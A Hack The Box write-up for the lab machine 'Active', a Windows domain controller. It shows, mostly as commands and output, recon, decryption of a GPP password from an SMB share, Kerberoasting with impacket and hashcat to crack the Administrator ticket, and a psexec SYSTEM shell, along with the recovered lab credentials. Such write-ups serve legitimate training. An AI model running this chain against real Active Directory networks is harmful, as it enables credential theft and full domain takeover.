---
title: Hack The Box - Active
date: 2023-01-18
categories: [hackthebox]
tags: [windows,smbmap,active directory,kerberoasting,smbclient,easy]
math: true
mermaid: true
toc: true
comments: true
---
![](/assets/Hackthebox/Active/0.png)
<img src="/assets/Hackthebox/Active/0.png" width="80%">

## RECON 


### NMAP


Starting with ``nmap``, nmap shows a bunch of open ports and the target is `Active Directory Domain Controller`  running on `Windows Server 2008 R2 SP1.`

```bash
$sudo nmap -sT -p- -oA alltcp 10.10.10.100
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-17 20:53 +0545

Nmap scan report for 10.10.10.100
Host is up (0.082s latency).
Not shown: 65512 closed tcp ports (conn-refused)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
49170/tcp open  unknown
49171/tcp open  unknown


$sudo nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49170,49171 10.10.10.100 -oN active-tcp-service.nmap
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-17 21:05 +0545
Nmap scan report for 10.10.10.100
Host is up (0.084s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-01-17 15:20:27Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2023-01-17T15:21:23
|_  start_date: 2023-01-17T14:52:45

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.46 seconds
```

### SMB - 445

`Smbmap` shows we have read access on `Replicaiton share`.

```bash
$smbmap -H 10.10.10.100
[+] IP: 10.10.10.100:445        Name: 10.10.10.100
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
        Users                                                   NO ACCESS
```

## REPLICATION SHARE

Since we can read replication share without password, we'll use `smbclient` to enumerate through the share. There's a intresting file `Groups.xml` we'll download it and have a look.
```
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\> cd Groups\
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> dir
  .                                   D        0  Sat Jul 21 16:22:44 2018
  ..                                  D        0  Sat Jul 21 16:22:44 2018
  Groups.xml                          A      533  Thu Jul 19 02:31:06 2018

                5217023 blocks of size 4096. 284105 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)
```
Theres a username and cpassword.

```xml
$cat Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

### GPP DECRYPT

we can decrypt the gpp hash using `gpp-decrypt`

```bash
$gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

now we have user credential `SVC_TGS:GPPstillStandingStrong2k18` which we can use to enumerate shares.

## USERS SHARE

Using smbmap to enumerate users share using `SVC_TGS` creds.

```bash
$smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
[+] IP: 10.10.10.100:445        Name: 10.10.10.100
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share
        Users                                                   READ ONLY
```

We can also use smbclinet to have look in the users share.

```bash
$smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Jul 21 20:24:20 2018
  ..                                 DR        0  Sat Jul 21 20:24:20 2018
  Administrator                       D        0  Mon Jul 16 15:59:21 2018
  All Users                       DHSrn        0  Tue Jul 14 10:51:44 2009
  Default                           DHR        0  Tue Jul 14 12:23:21 2009
  Default User                    DHSrn        0  Tue Jul 14 10:51:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 10:42:55 2009
  Public                             DR        0  Tue Jul 14 10:42:55 2009
  SVC_TGS                             D        0  Sat Jul 21 21:01:32 2018
```
we can now grab the `uesr.txt` file 

```bash
smb: \SVC_TGS\Desktop\> get user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)

$cat user.txt
47f872b0248126f48aa7ffa1e31cda29
```

## KERBEROASTING

### Get hash of administrator

we will now `impacket-GetUserSPNs` to get a list of service usernames associated with normal user accounts.

```bash
$impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -outputfile GetUserSPNs.out
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 00:51:40.351723  2023-01-17 20:38:45.732539
```

it gives the ticket of administrator, which we can try to bruteforce and decrypt the password.

```bash
$cat GetUserSPNs.out
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$b4280b69cde3574becd49754a4f07da3$12b3d53d702029a731961afeef1a0e8887c960f89b721fe7c0b38a3233a3b044703ab0324e9ace05eebda7e9a4be3bc3205c644c718711ce22230aaa4ff3af8f3a674e7d6d51124a62f8f97eee01a06cae599597491551538cd7e1c670814945ecbfac6a0ff8775fe89cb09bb7174f3994fd5151998f78173dd776ca243c9241f746a84cf8e88b970d2bae520d2cccb9b6c485ebf364b3cd930c4a3bfab3bf3caad8867b75e7dd1254a742abe2740e8be88c75736dbc6b6c4d32aa4de293974f22877411792b686427cc8d27186b4cdadad00707df5b8792fbca1439650ddee65c6c411f1975fa55f21c67fd8e86d91287c122dffecafa5f86019eff18866d2fecbaa171950f7c8acd684523a2d612120c3bfd0a60967fee8fbbadc6f1477c60d8263a5a58945a8ab1d4c9ef138f7af363bc2911d68782b980826a3d1c313d727b4d899c593945a7cd14653ad7448e51512b0649b8bb1582737cd03d78602bb85e312797c1aafd5f047d79f9b7f907215b8c3c8b4d8ea82d9b4fd2238a308b89c03c9a83e3ee0aa1c209019c23c0a7f209e01feb1b96bcf659f73e899c9fffa1fdf9960b64d31173d28c9485fe92c346010e8bb38a2f959d9b01fd51109ac80162bfdfb73e4aead53317008f09b5545ae8faf84f4946661bdf3fa11828e7b59f0d4766d549e904290ba7972efc5721077434de3a8947b607dc14f8e4f424acbeb5c95a2f8da4b9ca0360d1f61ea51cb5d2421f0161dfabc860e185505c6c6b66e0ffd183d3e2cf83ad975150e03987ff3e578da722850a6d9c24a52f30ad4772148c20812f8d5289d4dfbbf96a5d6b8d7ec969d32f5a83c1c1420b59bf358381b1487efc5348abb78843b2451368ad2d6a7ee7ba0625f2086ab342c91d2bcb75292e9c99f4a98aff768057b3bdd839e4336ac1a1b1f9e2fc49d88d4bf7f23c7665a5eadb9c699caf3e774bd79d3b80d578a7823529a77699809ac6babdde1a9fa63ac84ee437838a8e03642e7e64c7931e6b1a9e9000cbf4e5ef63429c4c4896f9b335db3e30f8e49e8aaad48877cd4f109c12fe9854a0e3b9032fa8f727ab442af07d462d0c209b2f0680dce97cffe36ffbdc53073467a1da3ec02dbe04857130f44ef6d8fdf3f498236f9d0182aa75df9539cc9ad70b05c35c64cb251c696aedf19b88e6f70bd426b6bd732fe82ab9f637ead98a1067c964906e2914ef435306f1de21d753bc3062f43d51117ac9a29f4bda03a98f2647a058
```

### Hashcat

Using hashcat to decrypt the ticket.

```bash
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force                                       
hashcat (v4.0.1) starting... 

$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$7028f37607953ce9fd6c9060de4aece5$55e2d21e37623a43d8cd5e36e39bfaffc52abead3887ca728d527874107ca042e0e9283ac478b1c91cab58c9
184828e7a5e0af452ad2503e463ad2088ba97964f65ac10959a3826a7f99d2d41e2a35c5a2c47392f160d65451156893242004cb6e3052854a9990bac4deb104f838f3e50eca3ba770fbed089e1c91c513b7c98149af2f9a
994655f5f13559e0acb003519ce89fa32a1dd1c8c7a24636c48a5c948317feb38abe54f875ffe259b6b25a63007798174e564f0d6a09479de92e6ed98f0887e19b1069b30e2ed8005bb8601faf4e476672865310c6a0ea0b
ea1ae10caff51715aea15a38fb2c1461310d99d6916445d7254f232e78cf9288231e436ab457929f50e6d4f70cbfcfd2251272961ff422c3928b0d702dcb31edeafd856334b64f74bbe486241d752e4cf2f6160b718b87aa
7c7161e95fab757005e5c80254a71d8615f4e89b0f4bd51575cc370e881a570f6e5b71dd14f50b8fd574a04978039e6f32d108fb4207d5540b4e58df5b8a0a9e36ec2d7fc1150bb41eb9244d96aaefb36055ebcdf435a42d
937dd86b179034754d2ac4db28a177297eaeeb86c229d0f121cf04b0ce32f63dbaa0bc5eafd47bb97c7b3a14980597a9cb2d83ce7c40e1b864c3b3a77539dd78ad41aceb950a421a707269f5ac25b27d5a6b7f334d37acc7
532451b55ded3fb46a4571ac27fc36cfad031675a85e0055d31ed154d1f273e18be7f7bc0c810f27e9e7951ccc48d976f7fa66309355422124ce6fda42f9df406563bc4c20d9005ba0ea93fac71891132113a15482f3d952
d54f22840b7a0a6000c8e8137e04a898a4fd1d87739bf5428d748086f0166b35c181729cc62b41ba6a9157333bb77c9e03dc9ac23782cf5dcebd11faad8ca3e3e74e25f21dc04ba9f1703bd51d100051c8f505cc8085056b
94e349b57906ee8deaf026b3daa89e7c3fc747a6a31ae08376da259f3118370bef86b6e7c2f88d66400eccb122dec8028223f6dcde29ffaa5b83ecb1c3780a782a5797c527a26a7b51b62db3e4865ebc2a0a0d2c931550de
cb3e7ae581b59f070dd33e423a90ec2ef66982a1b6336afe968fa93f5dd2880a313dc05d4e5cf104b6d9a8316b9fe3dc16e057e0f5c835e111ab92795fb0033541916a57df8f8e6b8cc25ecff2775282ccee110c49376c2c
ec6b7bb95c265f1466994da89e69605594ead28d24212a137ee20197d8aa95f243c347e02616f40f4071c33f749f5b94d1259fd32174:Ticketmaster1968
```

## SHELL AS ADMINISTRATOR

Using `impacket-psexec` to get the `administrator` shell.

```bash
$impacket-psexec administrator@10.10.10.100
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file bEDYZPTi.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service MuHf on 10.10.10.100.....
[*] Starting service MuHf.....
[!] Press help for extra shell commands                                                                                                                      Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami                                                                                                                                   nt authority\system
```

Reference: 

https://www.youtube.com/watch?v=Jaa2LmZaNeU